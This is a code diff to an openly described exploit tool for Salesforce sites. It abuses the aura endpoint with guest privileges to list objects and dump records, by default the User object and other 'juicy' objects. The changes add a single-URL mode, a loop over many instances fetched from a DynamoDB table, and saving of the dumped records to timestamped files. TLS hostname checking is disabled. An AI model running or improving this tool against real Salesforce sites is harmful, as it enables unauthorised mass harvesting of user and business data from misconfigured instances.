@@ -9,6 +9,8 @@ import os
 import sys
 import ssl
 import boto3
+from pathlib import Path
+from datetime import datetime
 
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
@@ -202,22 +204,23 @@ def dump_object(aura_endpoint, aura_context, object_name, page_size=DEFAULT_PAGE
     except:
         total_count = "0"
         result_count = []
-    print(f"[+] State: {state}, Total: {total_count}, Page: {page}, Result count: {len(result_count)}")
+
     if state == "ERROR":
         print(f"[+] Error message: {actions.get('error')[0]}")
         return None
+    else:
+        if not result_count:
+            print(f"[+] The state was a {state} but no results were fetched\n")
+            return response
+        return_value = response.get('actions')[0].get('returnValue')
+        print("[+] Results: " )
+        print(f"{TAB}{json.dumps(return_value, ensure_ascii=False, indent=2)}\n")
+        return response
 
-    return_value = response.get('actions')[0].get('returnValue')
-    print("[+] Results: " )
-    # print(f"{TAB}{json.dumps(return_value, ensure_ascii=False, indent=2)}\n")
-    return response
 
-
-def dump_and_save_objects(aura_endpoint, aura_context):
+def dump_and_save_objects(aura_endpoint, aura_context, path):
     sf_all_object_name_list = pull_object_list(aura_endpoint, aura_context)
-
     page_size = MAX_PAGE_SIZE
-
     failed_objects = []
 
     for object_name in sf_all_object_name_list:
@@ -233,9 +236,11 @@ def dump_and_save_objects(aura_endpoint, aura_context):
                 break
             if len(return_value.get('result')) < page_size :
                 break
+            file_path = path + "/" + object_name + ".txt"
+            write_result(file_path, str(return_value))
 
     if len(failed_objects) > 0:
-        print("[-] Failed to dump the following objects (please retry with the -o option to attempt to manually dump each of them):")
+        print("[-] Failed to dump the following objects (or some of their records), please retry with the -o option to attempt to manually dump each of them:")
         for obj in failed_objects:
             print(f"{TAB}[-] {obj}")
 
@@ -245,10 +250,20 @@ def fetch_instances():
     instances = table.scan()["Items"]
     return [item['url'] for item in instances]
 
+def create_dir(url):
+    dir_name = url.replace(":", "_").replace("/", "").replace(".", "_")
+    path = "./" + dir_name + "/" + datetime.now().strftime('%Y_%m_%d_%H_%M_%S')
+    Path(path).mkdir(parents=True, exist_ok=True)
+    return path
+
+def write_result(path, result):
+    f = open(path, "a")
+    f.write(result)
+    f.close()
     
 def init():
     parser = argparse.ArgumentParser(description='Exploit Salesforce through the aura endpoint with the guest privilege')
-    # parser.add_argument('-u', '--url', required=True, help='set the SITE url. e.g. http://url/site_path')
+    parser.add_argument('-u', '--url', help='set the SITE url. e.g. http://url/site_path')
     parser.add_argument('-o', '--objects', 
         help='set the object name. Default value is "User" object. Juicy Objects: %s' % ",".join(SF_OBJECT_NAME), 
         nargs='*', default=['User'])
@@ -261,43 +276,50 @@ def init():
     args = parser.parse_args()
 
     return args
-    
+
+def run(url):
+    print(f"[*] Checking for aura endpoints on {url}")
+    aura_endpoints = check(url)
+    if len(aura_endpoints) == 0:
+        print("[-] No aura endpoints found\n")
+        return
+
+    if args.check:
+        return
+
+    if args.aura_context is not None and len(args.aura_context) > 1:
+        aura_context = args.aura_context
+    else:
+        try:
+            aura_context = get_aura_context(url)
+        except Exception as e:
+            raise
+            print("[-] Failed to get aura context\n")
+            return
+
+    for aura_endpoint in aura_endpoints:
+        print(f"[*] Working with endpoint {aura_endpoint}")
+
+        if args.listobj:
+            sf_all_object_name_list = pull_object_list(aura_endpoint, aura_context)
+
+        elif args.dump_objects:
+            path = create_dir(url)
+            dump_and_save_objects(aura_endpoint, aura_context, path)
+
+        elif args.objects:
+            for object_name in args.objects:
+                dump_object(aura_endpoint, aura_context, object_name)
+
+        if not args.mass_collect:
+            return
 
 if __name__ == "__main__":
     instances = fetch_instances()
     args = init()
-    for instance in instances:
-        print(f"[*] Checking for aura endpoints on {instance}")
-        aura_endpoints = check(instance)
-        if len(aura_endpoints) == 0:
-            print("[-] No aura endpoints found\n")
-            continue
-
-        if args.check:
-            continue
-
-        if args.aura_context is not None and len(args.aura_context) > 1:
-            aura_context = args.aura_context
-        else:
-            try:
-                aura_context = get_aura_context(instance)
-            except Exception as e:
-                raise
-                print("[-] Failed to get aura context\n")
-                continue
-
-        for aura_endpoint in aura_endpoints:
-            print(f"[*] Working with endpoint {aura_endpoint}")
-
-            if args.listobj:
-                sf_all_object_name_list = pull_object_list(aura_endpoint, aura_context)
-
-            elif args.dump_objects:
-                dump_and_save_objects(aura_endpoint, aura_context)
-
-            elif args.objects:
-                for object_name in args.objects:
-                    dump_object(aura_endpoint, aura_context, object_name)
-
-            if not args.mass_collect:
-                break
+    if args.url:
+        run(args.url)
+    else:
+        print("[*] Fetching Salesforce instances as no URL was supplied")
+        for instance in instances:
+            run(instance)
